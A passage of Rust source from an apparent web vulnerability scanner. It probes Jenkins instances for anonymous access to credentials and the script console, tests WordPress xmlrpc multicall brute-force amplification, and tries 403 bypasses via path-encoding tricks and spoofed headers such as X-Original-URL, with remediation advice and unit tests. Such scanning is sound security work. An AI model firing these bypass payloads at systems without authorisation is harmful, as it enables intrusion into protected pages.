            (
                "/credentials/store/system/domain/_/api/json",
                "Jenkins credentials API",
            ),
            ("/manage", "Jenkins management page"),
            ("/configureSecurity", "Jenkins security configuration"),
            ("/securityRealm", "Jenkins authentication settings"),
            ("/asynchPeople/api/json", "Jenkins users list"),
            ("/view/all/builds", "Jenkins build history"),
            ("/pluginManager/api/json?depth=1", "Jenkins plugins list"),
            ("/systemInfo", "Jenkins system information"),
            ("/env-vars.html", "Jenkins environment variables"),
        ];

        // First check if this is a Jenkins instance
        let main_response = match self.http_client.get(url).await {
            Ok(r) => r,
            Err(_) => return vulnerabilities,
        };

        let is_jenkins = main_response.headers.get("x-jenkins").is_some()
            || main_response.headers.get("x-jenkins-session").is_some()
            || main_response.body.contains("Jenkins")
            || main_response.body.contains("hudson");

        if !is_jenkins {
            // Also try /api/json to detect Jenkins
            if let Ok(api_response) = self
                .http_client
                .get(&format!("{}/api/json", base_url))
                .await
            {
                if !api_response.body.contains("_class") || !api_response.body.contains("hudson") {
                    return vulnerabilities;
                }
            } else {
                return vulnerabilities;
            }
        }

        // Test each Jenkins path for anonymous access
        for (path, description) in jenkins_paths {
            let test_url = format!("{}{}", base_url, path);

            if let Ok(response) = self.http_client.get(&test_url).await {
                if response.status_code == 200 {
                    let body_lower = response.body.to_lowercase();

                    // Check if we got actual data (not login page)
                    let has_data = response.body.contains("_class")
                        || response.body.contains("\"name\"")
                        || response.body.contains("\"jobs\"")
                        || body_lower.contains("credentials")
                        || body_lower.contains("script console");

                    let is_login_page =
                        body_lower.contains("login") && body_lower.contains("password");

                    if has_data && !is_login_page {
                        let severity = if path.contains("script") || path.contains("credentials") {
                            Severity::Critical
                        } else if path.contains("api/json") {
                            Severity::High
                        } else {
                            Severity::Medium
                        };

                        vulnerabilities.push(Vulnerability {
                            id: format!("jenkins_anon_{}", uuid::Uuid::new_v4().to_string()),
                            vuln_type: "Jenkins Anonymous Access".to_string(),
                            severity: severity.clone(),
                            confidence: Confidence::High,
                            category: "Access Control".to_string(),
                            url: test_url.clone(),
                            parameter: None,
                            payload: path.to_string(),
                            description: format!(
                                "Jenkins allows anonymous read access to: {}\n\
                                {}",
                                path, description
                            ),
                            evidence: Some(format!(
                                "HTTP 200 returned with data. Response preview: {}...",
                                &response.body.chars().take(200).collect::<String>()
                            )),
                            cwe: "CWE-284".to_string(),
                            cvss: if severity == Severity::Critical { 9.8 } else { 7.5 },
                            verified: true,
                            false_positive: false,
                            remediation: "1. Go to Manage Jenkins → Configure Global Security\n\
                                          2. Enable security if disabled\n\
                                          3. Under Authorization, select 'Matrix-based security' or 'Role-Based Strategy'\n\
                                          4. Remove Anonymous user read permissions\n\
                                          5. Ensure only authenticated users have access\n\
                                          6. Review and restrict script console access\n\
                                          7. Secure credentials plugin".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                        });
                    }
                }
            }
        }

        vulnerabilities
    }

    /// Test WordPress xmlrpc.php for brute force vulnerability
    async fn test_wordpress_xmlrpc(&self, url: &str) -> Vec<Vulnerability> {
        let mut vulnerabilities = Vec::new();

        let parsed = match url::Url::parse(url) {
            Ok(u) => u,
            Err(_) => return vulnerabilities,
        };

        let base_url = format!("{}://{}", parsed.scheme(), parsed.host_str().unwrap_or(""));
        let xmlrpc_url = format!("{}/xmlrpc.php", base_url);

        // Test if xmlrpc.php exists and accepts requests
        if let Ok(response) = self.http_client.post(&xmlrpc_url,
            r#"<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>"#.to_string()
        ).await {
            if response.status_code == 200 && response.body.contains("methodResponse") {
                // xmlrpc.php is enabled and responding

                // Check if multicall is enabled (allows amplified brute force)
                let multicall_test = r#"<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params><param><value><array><data>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>test</string></value>
<value><string>test</string></value>
</data></array></value></member>
</struct></value>
</data></array></value></param></params>
</methodCall>"#;

                if let Ok(multicall_response) = self.http_client.post(&xmlrpc_url, multicall_test.to_string()).await {
                    let has_multicall = multicall_response.body.contains("methodResponse") &&
                                        !multicall_response.body.contains("faultCode");

                    if has_multicall {
                        vulnerabilities.push(Vulnerability {
                            id: format!("wp_xmlrpc_{}", uuid::Uuid::new_v4().to_string()),
                            vuln_type: "WordPress XML-RPC Brute Force Amplification".to_string(),
                            severity: Severity::High,
                            confidence: Confidence::High,
                            category: "Authentication".to_string(),
                            url: xmlrpc_url.clone(),
                            parameter: None,
                            payload: "system.multicall with wp.getUsersBlogs".to_string(),
                            description: "WordPress xmlrpc.php is enabled with system.multicall support. \
                                This allows attackers to perform amplified brute force attacks by testing \
                                hundreds of password combinations in a single HTTP request, bypassing \
                                rate limiting and login lockout plugins.".to_string(),
                            evidence: Some(format!(
                                "xmlrpc.php responds to multicall requests. This enables:\n\
                                - Testing 500+ passwords per HTTP request\n\
                                - Bypassing wp-login.php rate limiting\n\
                                - Bypassing login lockout plugins\n\
                                - Fast credential stuffing attacks\n\n\
                                Response: {}...",
                                &multicall_response.body.chars().take(200).collect::<String>()
                            )),
                            cwe: "CWE-307".to_string(),
                            cvss: 7.5,
                            verified: true,
                            false_positive: false,
                            remediation: "1. Disable XML-RPC completely if not needed:\n\
                                          Add to .htaccess:\n\
                                          <Files xmlrpc.php>\n\
                                          Order Deny,Allow\n\
                                          Deny from all\n\
                                          </Files>\n\n\
                                          2. Or use a security plugin to disable XML-RPC:\n\
                                          - Wordfence\n\
                                          - Disable XML-RPC plugin\n\
                                          - iThemes Security\n\n\
                                          3. Or disable multicall specifically:\n\
                                          add_filter('xmlrpc_methods', function($methods) {\n\
                                              unset($methods['system.multicall']);\n\
                                              return $methods;\n\
                                          });".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                        });
                    } else {
                        // xmlrpc enabled but multicall might be disabled
                        vulnerabilities.push(Vulnerability {
                            id: format!("wp_xmlrpc_enabled_{}", uuid::Uuid::new_v4().to_string()),
                            vuln_type: "WordPress XML-RPC Enabled".to_string(),
                            severity: Severity::Medium,
                            confidence: Confidence::High,
                            category: "Authentication".to_string(),
                            url: xmlrpc_url.clone(),
                            parameter: None,
                            payload: "system.listMethods".to_string(),
                            description: "WordPress xmlrpc.php is enabled. While multicall may be disabled, \
                                XML-RPC still allows brute force attempts and should be disabled if not needed.".to_string(),
                            evidence: Some("xmlrpc.php returns valid methodResponse".to_string()),
                            cwe: "CWE-307".to_string(),
                            cvss: 5.3,
                            verified: true,
                            false_positive: false,
                            remediation: "Disable XML-RPC if not needed for Jetpack or mobile apps".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                        });
                    }
                }
            }
        }

        vulnerabilities
    }

    /// Test for pages accessible without authentication
    async fn test_unauthenticated_page_access(&self, url: &str) -> Vec<Vulnerability> {
        let mut vulnerabilities = Vec::new();

        let parsed = match url::Url::parse(url) {
            Ok(u) => u,
            Err(_) => return vulnerabilities,
        };

        let base_url = format!("{}://{}", parsed.scheme(), parsed.host_str().unwrap_or(""));

        // Common protected paths that should require login
        let protected_paths = vec![
            "/admin",
            "/dashboard",
            "/panel",
            "/portal",
            "/manage",
            "/settings",
            "/config",
            "/configuration",
            "/users",
            "/accounts",
            "/profile",
            "/my-account",
            "/account",
            "/user",
            "/internal",
            "/private",
            "/secure",
            "/protected",
            "/api/users",
            "/api/admin",
            "/api/config",
            "/api/settings",
            "/backend",
            "/control",
            "/cms",
            "/manager",
            "/hallinta",
            "/asetukset", // Finnish
            "/verwaltung",
            "/einstellungen", // German
        ];

        // First get main page to check if site has authentication
        let main_response = match self.http_client.get(url).await {
            Ok(r) => r,
            Err(_) => return vulnerabilities,
        };

        let main_has_login = main_response.body.to_lowercase().contains("login")
            || main_response.body.to_lowercase().contains("sign in");

        if !main_has_login {
            return vulnerabilities;
        }

        for path in protected_paths {
            let test_url = format!("{}{}", base_url, path);

            if let Ok(response) = self.http_client.get(&test_url).await {
                if response.status_code == 200 {
                    let body_lower = response.body.to_lowercase();

                    // Check if we got actual protected content (not login redirect)
                    let has_protected_content = (body_lower.contains("user")
                        && body_lower.contains("email"))
                        || body_lower.contains("settings")
                        || body_lower.contains("configuration")
                        || body_lower.contains("dashboard")
                        || body_lower.contains("admin panel")
                        || body_lower.contains("management");

                    let is_login_page = body_lower.contains("login")
                        && body_lower.contains("password")
                        && body_lower.contains("form");

                    if has_protected_content && !is_login_page && response.body.len() > 500 {
                        vulnerabilities.push(Vulnerability {
                            id: format!("unauth_access_{}", uuid::Uuid::new_v4().to_string()),
                            vuln_type: "Unauthenticated Access to Protected Page".to_string(),
                            severity: Severity::High,
                            confidence: Confidence::Medium,
                            category: "Access Control".to_string(),
                            url: test_url.clone(),
                            parameter: None,
                            payload: path.to_string(),
                            description: format!(
                                "The protected page '{}' is accessible without authentication. \
                                This may expose sensitive functionality or data to unauthenticated users.",
                                path
                            ),
                            evidence: Some(format!(
                                "HTTP 200 returned with content ({} bytes). Site has login functionality but this page is accessible.",
                                response.body.len()
                            )),
                            cwe: "CWE-284".to_string(),
                            cvss: 7.5,
                            verified: true,
                            false_positive: false,
                            remediation: "1. Implement authentication middleware for all protected routes\n\
                                          2. Ensure server-side authentication checks on every request\n\
                                          3. Don't rely only on client-side route protection\n\
                                          4. Review and test all endpoints for proper access control".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                        });
                    }
                }
            }
        }

        vulnerabilities
    }

    /// Test HTTP DEBUG/TRACE methods for server version disclosure
    async fn test_http_debug_method(&self, _url: &str) -> Vec<Vulnerability> {
        let vulnerabilities = Vec::new();

        // NOTE: HttpClient doesn't have a generic request() method that supports arbitrary HTTP methods.
        // This test would require HttpClient to support methods like DEBUG, TRACE, TRACK, OPTIONS.
        // Commenting out until HttpClient is enhanced with a generic request method.

        // Test DEBUG method - some servers respond with version info
        // let methods_to_test = vec!["DEBUG", "TRACE", "TRACK", "OPTIONS"];
        //
        // for method in methods_to_test {
        //     if let Ok(response) = self.http_client.request(method, url, None, None).await {
        //         // Check headers for version disclosure
        //         let mut version_info = Vec::new();
        //
        //         for (key, value) in &response.headers {
        //             let key_lower = key.to_lowercase();
        //             let value_lower = value.to_lowercase();
        //
        //             // Server version in headers
        //             if key_lower == "server" && (value.contains("/") || value.chars().any(|c| c.is_numeric())) {
        //                 version_info.push(format!("{}: {}", key, value));
        //             }
        //
        //             // X-Powered-By header
        //             if key_lower == "x-powered-by" {
        //                 version_info.push(format!("{}: {}", key, value));
        //             }
        //
        //             // X-AspNet-Version
        //             if key_lower.contains("aspnet") || key_lower.contains("asp-net") {
        //                 version_info.push(format!("{}: {}", key, value));
        //             }
        //
        //             // X-Debug headers
        //             if key_lower.contains("debug") || key_lower.contains("version") {
        //                 version_info.push(format!("{}: {}", key, value));
        //             }
        //         }
        //
        //         // Check body for version info (TRACE/DEBUG might reflect this)
        //         let body_version_patterns = vec![
        //             (r"nginx/(\d+\.\d+\.\d+)", "nginx"),
        //             (r"Apache/(\d+\.\d+\.\d+)", "Apache"),
        //             (r"PHP/(\d+\.\d+\.\d+)", "PHP"),
        //             (r"Server:\s*([^\r\n]+)", "Server"),
        //         ];
        //
        //         for (pattern, name) in body_version_patterns {
        //             if let Ok(re) = regex::Regex::new(pattern) {
        //                 if let Some(cap) = re.captures(&response.body) {
        //                     if let Some(version) = cap.get(1) {
        //                         version_info.push(format!("{}: {}", name, version.as_str()));
        //                     }
        //                 }
        //             }
        //         }
        //
        //         if !version_info.is_empty() {
        //             let severity = if method == "DEBUG" || method == "TRACE" {
        //                 Severity::Medium
        //             } else {
        //                 Severity::Low
        //             };
        //
        //             vulnerabilities.push(Vulnerability {
        //                 id: format!("http_debug_{}", uuid::Uuid::new_v4().to_string()),
        //                 vuln_type: format!("Server Version Disclosure via HTTP {} Method", method),
        //                 severity,
        //                 confidence: Confidence::High,
        //                 category: "Information Disclosure".to_string(),
        //                 url: url.to_string(),
        //                 parameter: None,
        //                 payload: format!("{} request", method),
        //                 description: format!(
        //                     "HTTP {} method reveals server version information. This helps attackers \
        //                     identify known vulnerabilities for specific server versions.\n\n\
        //                     Disclosed information:\n{}",
        //                     method,
        //                     version_info.join("\n")
        //                 ),
        //                 evidence: Some(format!(
        //                     "HTTP {} returned:\n{}\n\nStatus: {}",
        //                     method,
        //                     version_info.join("\n"),
        //                     response.status_code
        //                 )),
        //                 cwe: "CWE-200".to_string(),
        //                 cvss: if method == "TRACE" { 5.3 } else { 3.7 },
        //                 verified: true,
        //                 false_positive: false,
        //                 remediation: format!(
        //                     "1. Disable {} method in web server config:\n\n\
        //                     For Nginx:\n\
        //                     if ($request_method ~* ^(DEBUG|TRACE|TRACK)$) {{\n\
        //                         return 405;\n\
        //                     }}\n\n\
        //                     For Apache:\n\
        //                     TraceEnable off\n\
        //                     RewriteEngine On\n\
        //                     RewriteCond %{{REQUEST_METHOD}} ^(TRACE|TRACK|DEBUG)\n\
        //                     RewriteRule .* - [F]\n\n\
        //                     2. Remove Server version from headers:\n\
        //                     Nginx: server_tokens off;\n\
        //                     Apache: ServerTokens Prod\n\
        //                             ServerSignature Off",
        //                     method
        //                 ),
        //                 discovered_at: chrono::Utc::now().to_rfc3339(),
        //                 ml_data: None,
        //             });
        //
        //             break; // Found disclosure, no need to test more methods
        //         }
        //     }
        // }

        vulnerabilities
    }

    /// Test 403 Bypass - dynamically extract paths from source and try bypass techniques
    async fn test_403_bypass(&self, url: &str) -> Vec<Vulnerability> {
        let mut vulnerabilities = Vec::new();

        // First, fetch the page to extract paths from source
        let Ok(response) = self.http_client.get(url).await else {
            return vulnerabilities;
        };

        let body = &response.body;
        let parsed_url = match url::Url::parse(url) {
            Ok(u) => u,
            Err(_) => return vulnerabilities,
        };
        let base_url = format!(
            "{}://{}",
            parsed_url.scheme(),
            parsed_url.host_str().unwrap_or("")
        );

        // Extract paths from HTML/JS
        let mut paths_to_test: Vec<String> = Vec::new();

        // Extract href values
        let href_re = regex::Regex::new(r#"href\s*=\s*["']([^"']*?)["']"#).unwrap();
        for cap in href_re.captures_iter(body) {
            if let Some(path) = cap.get(1) {
                let p = path.as_str();
                if p.starts_with('/') && !p.starts_with("//") && !p.contains('.') {
                    paths_to_test.push(p.to_string());
                }
            }
        }

        // Extract router paths from Vue/React/Angular
        let router_patterns = [
            r#"path\s*:\s*["']([^"']+)["']"#,
            r#"route\s*:\s*["']([^"']+)["']"#,
            r#"to\s*=\s*["']([^"']+)["']"#,
            r#"navigate\s*\(\s*["']([^"']+)["']"#,
            r#"push\s*\(\s*["']([^"']+)["']"#,
            r#"replace\s*\(\s*["']([^"']+)["']"#,
            // More aggressive JS extraction
            r#"["'](/[a-zA-Z][a-zA-Z0-9_/-]*)["']"#, // Any path-like string "/something"
            r#"url\s*:\s*["']([^"']+)["']"#,         // url: "/path"
            r#"endpoint\s*:\s*["']([^"']+)["']"#,    // endpoint: "/api/..."
            r#"api\s*:\s*["']([^"']+)["']"#,         // api: "/api/..."
            r#"fetch\s*\(\s*["']([^"']+)["']"#,      // fetch("/api/...")
            r#"axios\.[a-z]+\s*\(\s*["']([^"']+)["']"#, // axios.get("/api/...")
            r#"\$http\.[a-z]+\s*\(\s*["']([^"']+)["']"#, // $http.get("/api/...")
            r#"redirect\s*:\s*["']([^"']+)["']"#,    // redirect: "/login"
        ];
        for pattern in router_patterns {
            if let Ok(re) = regex::Regex::new(pattern) {
                for cap in re.captures_iter(body) {
                    if let Some(path) = cap.get(1) {
                        let p = path.as_str();
                        // Include paths that start with / but exclude static assets
                        if p.starts_with('/') && !p.starts_with("//") {
                            // Skip common static file extensions
                            let skip_extensions = [
                                ".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
                                ".woff", ".ttf", ".eot",
                            ];
                            let is_static = skip_extensions.iter().any(|ext| p.ends_with(ext));
                            if !is_static && p.len() > 1 && p.len() < 100 {
                                paths_to_test.push(p.to_string());
                            }
                        }
                    }
                }
            }
        }

        // Also extract paths from JS bundles (vendor.js, app.js, etc.)
        let js_url_re = regex::Regex::new(r#"src\s*=\s*["']([^"']*\.js)["']"#).unwrap();
        let mut js_urls: Vec<String> = Vec::new();
        for cap in js_url_re.captures_iter(body) {
            if let Some(js_path) = cap.get(1) {
                let js_src = js_path.as_str();
                let js_url = if js_src.starts_with("http") {
                    js_src.to_string()
                } else if js_src.starts_with('/') {
                    format!("{}{}", base_url, js_src)
                } else {
                    format!("{}/{}", base_url, js_src)
                };
                js_urls.push(js_url);
            }
        }

        // Fetch and extract paths from JS bundles
        for js_url in js_urls.iter().take(5) {
            // Limit to 5 JS files
            if let Ok(js_response) = self.http_client.get(js_url).await {
                let js_body = &js_response.body;
                // Extract path strings from JS
                if let Ok(re) = regex::Regex::new(r#"["'](/[a-zA-Z][a-zA-Z0-9_/-]{2,50})["']"#) {
                    for cap in re.captures_iter(js_body) {
                        if let Some(path) = cap.get(1) {
                            let p = path.as_str();
                            let skip_extensions = [
                                ".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
                                ".woff", ".ttf", ".eot", ".map",
                            ];
                            let is_static = skip_extensions.iter().any(|ext| p.ends_with(ext));
                            if !is_static && p.len() > 1 && p.len() < 100 {
                                paths_to_test.push(p.to_string());
                            }
                        }
                    }
                }
            }
        }

        // Also add common admin/protected paths
        let common_paths = [
            "/admin",
            "/dashboard",
            "/api/admin",
            "/management",
            "/panel",
            "/config",
            "/settings",
            "/users",
            "/internal",
            "/private",
            "/driver",
            "/drivers",
            "/reports",
            "/export",
            "/imports",
            "/system",
            "/console",
            "/backend",
            "/portal",
            "/secure",
        ];
        for p in common_paths {
            if !paths_to_test.contains(&p.to_string()) {
                paths_to_test.push(p.to_string());
            }
        }

        // Deduplicate
        paths_to_test.sort();
        paths_to_test.dedup();

        info!(
            "[403-Bypass] Extracted {} unique paths for access testing",
            paths_to_test.len()
        );

        // 403 Bypass techniques
        let bypass_techniques: Vec<(&str, Box<dyn Fn(&str) -> String + Send + Sync>)> = vec![
            // Path manipulation
            (
                "trailing slash",
                Box::new(|p: &str| format!("{}/", p.trim_end_matches('/'))),
            ),
            (
                "double slash",
                Box::new(|p: &str| format!("/{}", p.trim_start_matches('/'))),
            ),
            ("dot segment", Box::new(|p: &str| format!("{}/..", p))),
            ("dot bypass", Box::new(|p: &str| format!("{}/.", p))),
            ("semicolon", Box::new(|p: &str| format!("{};/", p))),
            ("null byte", Box::new(|p: &str| format!("{}%00", p))),
            ("percent20", Box::new(|p: &str| format!("{}%20", p))),
            ("tab char", Box::new(|p: &str| format!("{}%09", p))),
            (
                "url encode",
                Box::new(|p: &str| {
                    let encoded: String = p.chars().map(|c| format!("%{:02X}", c as u8)).collect();
                    encoded
                }),
            ),
            (
                "double url encode",
                Box::new(|p: &str| {
                    let encoded: String =
                        p.chars().map(|c| format!("%25{:02X}", c as u8)).collect();
                    encoded
                }),
            ),
            (
                "unicode bypass",
                Box::new(|p: &str| p.replace('/', "%c0%af")),
            ),
            (
                "case variation",
                Box::new(|p: &str| {
                    p.chars()
                        .enumerate()
                        .map(|(i, c)| {
                            if i % 2 == 0 {
                                c.to_uppercase().next().unwrap_or(c)
                            } else {
                                c.to_lowercase().next().unwrap_or(c)
                            }
                        })
                        .collect()
                }),
            ),
            ("backslash", Box::new(|p: &str| p.replace('/', "\\"))),
            (
                "mixed slash",
                Box::new(|p: &str| format!("/{}/\\", p.trim_matches('/'))),
            ),
        ];

        // Header-based bypass techniques
        let bypass_headers = [
            ("X-Original-URL", ""), // Will be set to the path
            ("X-Rewrite-URL", ""),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Forwarded-Host", "localhost"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
            ("X-Originating-IP", "127.0.0.1"),
            ("X-Client-IP", "127.0.0.1"),
            ("Client-IP", "127.0.0.1"),
            ("True-Client-IP", "127.0.0.1"),
            ("Cluster-Client-IP", "127.0.0.1"),
            ("X-ProxyUser-Ip", "127.0.0.1"),
            ("Host", "localhost"),
        ];

        // Test each path
        for path in paths_to_test.iter().take(50) {
            // Limit to 50 paths
            let original_url = format!("{}{}", base_url, path);

            // First check if path returns 403
            let Ok(original_response) = self.http_client.get(&original_url).await else {
                continue;
            };

            if original_response.status_code != 403 && original_response.status_code != 401 {
                continue; // Only test 403/401 paths
            }

            info!(
                "[403-Bypass] Testing {} bypass techniques on: {} (HTTP {})",
                bypass_techniques.len() + bypass_headers.len(),
                path,
                original_response.status_code
            );

            // Try path-based bypasses
            for (technique_name, transform) in &bypass_techniques {
                let bypass_path = transform(path);
                let bypass_url = format!("{}{}", base_url, bypass_path);

                if let Ok(bypass_response) = self.http_client.get(&bypass_url).await {
                    // Bypass successful if we get 200 where we got 403/401
                    if bypass_response.status_code == 200 {
                        let body_len = bypass_response.body.len();
                        // Verify it's not just an error page (should have substantial content)
                        if body_len > 500
                            && !bypass_response.body.to_lowercase().contains("forbidden")
                        {
                            vulnerabilities.push(Vulnerability {
                                id: format!("403_bypass_{}", rand::random::<u16>()),
                                vuln_type: "403 Forbidden Bypass".to_string(),
                                severity: Severity::High,
                                confidence: Confidence::High,
                                category: "Access Control".to_string(),
                                url: bypass_url.clone(),
                                parameter: None,
                                payload: format!("{}: {} -> {}", technique_name, path, bypass_path),
                                description: format!(
                                    "The 403 Forbidden restriction on '{}' can be bypassed using {} technique.\n\n\
                                    Original path '{}' returns HTTP 403.\n\
                                    Bypass path '{}' returns HTTP 200 with {} bytes of content.",
                                    path, technique_name, path, bypass_path, body_len
                                ),
                                evidence: Some(format!(
                                    "Original: GET {} -> HTTP {}\nBypass: GET {} -> HTTP 200",
                                    original_url, original_response.status_code, bypass_url
                                )),
                                cwe: "CWE-863".to_string(), // Incorrect Authorization
                                cvss: 8.6,
                                verified: true,
                                false_positive: false,
                                remediation: format!(
                                    "1. Normalize paths in your application before authorization checks\n\
                                    2. Use a Web Application Firewall (WAF) to detect path manipulation\n\
                                    3. Implement proper path canonicalization:\n\n\
                                    For Nginx:\n\
                                    merge_slashes on;\n\
                                    location = {} {{\n    # proper auth check\n}}\n\n\
                                    For application code, always normalize paths before auth checks.",
                                    path
                                ),
                                discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                            });
                            break; // One bypass found for this path is enough
                        }
                    }
                }
            }

            // Try header-based bypasses
            for (header_name, header_value) in &bypass_headers {
                let value = if header_value.is_empty() {
                    path.as_str()
                } else {
                    *header_value
                };
                let headers = vec![(header_name.to_string(), value.to_string())];

                // For X-Original-URL/X-Rewrite-URL, request the root but with header pointing to path
                let request_url =
                    if *header_name == "X-Original-URL" || *header_name == "X-Rewrite-URL" {
                        format!("{}/", base_url)
                    } else {
                        original_url.clone()
                    };

                if let Ok(bypass_response) = self
                    .http_client
                    .get_with_headers(&request_url, headers)
                    .await
                {
                    if bypass_response.status_code == 200 {
                        let body_len = bypass_response.body.len();
                        if body_len > 500
                            && !bypass_response.body.to_lowercase().contains("forbidden")
                        {
                            vulnerabilities.push(Vulnerability {
                                id: format!("403_header_bypass_{}", rand::random::<u16>()),
                                vuln_type: "403 Forbidden Bypass via Header".to_string(),
                                severity: Severity::Critical,
                                confidence: Confidence::High,
                                category: "Access Control".to_string(),
                                url: original_url.clone(),
                                parameter: None,
                                payload: format!("{}: {}", header_name, value),
                                description: format!(
                                    "The 403 Forbidden restriction on '{}' can be bypassed using the {} header.\n\n\
                                    This is a critical vulnerability often caused by misconfigured reverse proxies \
                                    that trust headers like X-Original-URL for routing decisions.",
                                    path, header_name
                                ),
                                evidence: Some(format!(
                                    "Original: GET {} -> HTTP {}\nBypass: GET {} with header {} -> HTTP 200",
                                    original_url, original_response.status_code, request_url, header_name
                                )),
                                cwe: "CWE-863".to_string(),
                                cvss: 9.8,
                                verified: true,
                                false_positive: false,
                                remediation: format!(
                                    "1. Remove or ignore {} header in your web server/proxy config\n\n\
                                    For Nginx:\n\
                                    proxy_set_header {} \"\";\n\n\
                                    For Apache:\n\
                                    RequestHeader unset {}\n\n\
                                    2. Ensure authorization checks happen after path canonicalization\n\
                                    3. Configure your reverse proxy to not pass through these headers",
                                    header_name, header_name, header_name
                                ),
                                discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                            });
                            break;
                        }
                    }
                }
            }
        }

        vulnerabilities
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Self
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[test]
    fn test_sql_injection_detection() {
        let scanner = AuthBypassScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: "Welcome to your dashboard, admin! You are logged in.".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_sql_auth_bypass(&response, "https://example.com/login", &mut vulns);

        assert!(vulns.len() > 0, "Should detect SQL injection auth bypass");
        assert_eq!(vulns[0].severity, Severity::Critical);
    }

    #[test]
    fn test_empty_password_detection() {
        let scanner = AuthBypassScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: "Welcome to the dashboard".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_empty_password_bypass(&response, "https://example.com/login", &mut vulns);

        assert_eq!(vulns.len(), 1, "Should detect empty password bypass");
        assert_eq!(vulns[0].severity, Severity::Critical);
    }

    #[test]
    fn test_no_false_positive() {
        let scanner = AuthBypassScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 401,
            body: "Invalid credentials".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_sql_auth_bypass(&response, "https://example.com/login", &mut vulns);

        assert_eq!(vulns.len(), 0, "Should not report false positive");
    }

    #[test]
    fn test_redirect_detection() {
        let scanner = AuthBypassScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 302,
            body: String::new(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_sql_auth_bypass(&response, "https://example.com/login", &mut vulns);

        assert!(vulns.len() > 0, "Should detect bypass via redirect");
    }

    #[test]
    fn test_default_credentials_detection() {
        let scanner = AuthBypassScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: "Welcome admin!".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let mut vulns = Vec::new();
        scanner.check_default_credentials(&response, "https://example.com/login", &mut vulns);

        assert_eq!(vulns.len(), 1, "Should detect default credentials");
        assert_eq!(vulns[0].severity, Severity::Critical);
    }
}
